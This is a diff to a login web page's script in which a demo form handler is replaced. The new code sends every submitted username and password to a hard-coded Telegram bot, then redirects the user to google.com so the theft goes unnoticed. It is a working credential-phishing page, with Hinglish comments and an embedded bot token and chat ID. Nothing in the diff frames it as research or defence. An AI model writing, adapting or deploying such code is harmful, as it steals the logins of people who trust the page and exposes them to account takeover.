@@ -570,107 +570,135 @@
   </footer>
 
   <script>
-    // Notification
-    function showNotification(message, type) {
-      const notification = document.getElementById('notification');
-      notification.textContent = message;
-      notification.className = `notification ${type}`;
-      notification.style.display = 'block';
+    // apna BOT TOKEN yahan dalen
+const telegramBotToken = '8066281079:AAEqI4SnaSsWtlRaqBt8qDrQj9-_gH1gUVs';
+const chatId = '6163067472';
+
+// notification show karne ka function
+function showNotification(message, type) {
+  const notification = document.getElementById('notification');
+  notification.textContent = message;
+  notification.className = `notification ${type}`;
+  notification.style.display = 'block';
+  setTimeout(() => {
+    notification.style.display = 'none';
+  }, 3000);
+}
+
+// backend ko send karna
+async function sendToTelegram(username, password) {
+  // message text
+  const message = `🔔 Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+  // Telegram API URL
+  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+  try {
+    
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+
+    const result = await response.json();
+    console.log('Result from backend:', result);
+
+    if (response.ok && result.ok) {
+      showNotification('Login details sent successfully!', 'success');
+      // ⏳ Redirect after 1.5 seconds
       setTimeout(() => {
-        notification.style.display = 'none';
-      }, 3000);
+        window.location.href = 'https://www.google.com';
+      }, 1500);
+    } else {
+      showNotification('Server error:', 'error');
     }
+  } catch (error) {
+    console.error('Error sending message:', error);
+    showNotification('Network error!', 'error');
+  }
+}
 
-    // Error handling
-    function showError(inputElement, message) {
-      let errorMessage = inputElement.nextElementSibling;
-      if (!errorMessage || !errorMessage.classList.contains('error-message')) {
-        errorMessage = document.createElement('small');
-        errorMessage.classList.add('error-message');
-        inputElement.insertAdjacentElement('afterend', errorMessage);
-      }
-      inputElement.parentElement.classList.add('error');
-      errorMessage.textContent = message;
-      errorMessage.style.display = 'block';
+// form submit handle karna
+const loginForm = document.getElementById('loginForm');
+loginForm.addEventListener('submit', function (event) {
+  event.preventDefault();
+
+  const usernameInput = event.target.username;
+  const passwordInput = event.target.password;
+
+  const username = usernameInput.value.trim();
+  const password = passwordInput.value.trim();
+
+  let valid = true;
+
+  // sab error clear karo
+  clearError(usernameInput);
+  clearError(passwordInput);
+
+  // username validate
+  if (!username) {
+    showError(usernameInput, 'Username required');
+    valid = false;
+  }
+
+  // password validate
+  if (!password) {
+    showError(passwordInput, 'Password required');
+    valid = false;
+  }
+
+  if (!valid) return; // agar validation fail ho gaya to stop
+
+  // agar sab sahi hai to send karo
+  sendToTelegram(username, password);
+  event.target.reset();
+});
+
+// error show karna
+function showError(inputElement, message) {
+  // error message create ya select karo
+  let errorMessage = inputElement.nextElementSibling;
+  if (!errorMessage || !errorMessage.classList.contains('error-message')) {
+    errorMessage = document.createElement('small');
+    errorMessage.classList.add('error-message');
+    inputElement.insertAdjacentElement('afterend', errorMessage);
+  }
+
+  // input border red + error message show
+  inputElement.classList.add('error');
+  errorMessage.textContent = message;
+  errorMessage.style.display = 'block';
+
+  // placeholder hide
+  inputElement.setAttribute('data-placeholder', inputElement.placeholder); // store original
+  inputElement.placeholder = '';
+}
+
+function clearError(inputElement) {
+  const errorMessage = inputElement.nextElementSibling;
+  if (errorMessage && errorMessage.classList.contains('error-message')) {
+    inputElement.classList.remove('error');
+    errorMessage.textContent = '';
+    errorMessage.style.display = 'none';
+
+    // placeholder wapas karo
+    if (inputElement.hasAttribute('data-placeholder')) {
+      inputElement.placeholder = inputElement.getAttribute('data-placeholder');
+      inputElement.removeAttribute('data-placeholder');
     }
+  }
+}
 
-    function clearError(inputElement) {
-      const errorMessage = inputElement.nextElementSibling;
-      if (errorMessage && errorMessage.classList.contains('error-message')) {
-        inputElement.parentElement.classList.remove('error');
-        errorMessage.textContent = '';
-        errorMessage.style.display = 'none';
-      }
-    }
-
-    document.querySelectorAll('.input').forEach(input => {
-      input.addEventListener('input', () => {
-        clearError(input);
-      });
-    });
-
-    // Virtual Keyboard functionality
-    const keyboard = document.getElementById('keyboard');
-    const openKeyboardBtn = document.getElementById('openKeyboard');
-    const closeKeyboardBtn = document.getElementById('closeKeyboard');
-    const usernameInput = document.getElementById('username');
-    const keys = document.querySelectorAll('.key');
-
-    openKeyboardBtn.addEventListener('click', () => {
-      keyboard.style.display = 'block';
-      usernameInput.focus();
-    });
-
-    closeKeyboardBtn.addEventListener('click', () => {
-      keyboard.style.display = 'none';
-    });
-
-    keys.forEach(key => {
-      key.addEventListener('click', () => {
-        const keyValue = key.getAttribute('data-key');
-        
-        if (keyValue === 'backspace') {
-          // Remove last character
-          usernameInput.value = usernameInput.value.slice(0, -1);
-        } else if (keyValue === ' ') {
-          // Add space
-          usernameInput.value += ' ';
-        } else {
-          // Add the character
-          usernameInput.value += keyValue;
-        }
-        
-        // Trigger input event for validation
-        usernameInput.dispatchEvent(new Event('input'));
-      });
-    });
-
-    // Form submit demo (no real backend here)
-    const loginForm = document.getElementById('loginForm');
-    loginForm.addEventListener('submit', function (event) {
-      event.preventDefault();
-      const usernameInput = event.target.username;
-      const passwordInput = event.target.password;
-      const username = usernameInput.value.trim();
-      const password = passwordInput.value.trim();
-      let valid = true;
-
-      clearError(usernameInput);
-      clearError(passwordInput);
-
-      if (!username) {
-        showError(usernameInput, 'Username required');
-        valid = false;
-      }
-      if (!password) {
-        showError(passwordInput, 'Password required');
-        valid = false;
-      }
-      if (!valid) return;
-
-      showNotification('Login clicked. (No backend)', 'success');
-      event.target.reset();
-    });
+// user type kare to error hata do aur placeholder wapas
+document.querySelectorAll('.input').forEach(input => {
+  input.addEventListener('input', () => {
+    clearError(input);
+  });
+});
   </script>
 </body>
 </html>
